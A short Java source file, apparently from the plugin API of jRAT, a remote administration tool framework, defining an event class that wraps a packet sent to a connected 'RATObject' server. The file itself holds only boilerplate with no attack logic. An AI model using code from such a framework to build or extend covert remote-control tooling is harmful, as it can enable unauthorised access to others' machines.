package org.jrat.project.api.events;

import org.jrat.project.api.Packet;
import org.jrat.project.api.RATObject;

public class OnSendPacketEvent extends RATObjectEvent {

	private Packet packet;

	public OnSendPacketEvent(Packet packet, RATObject server) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
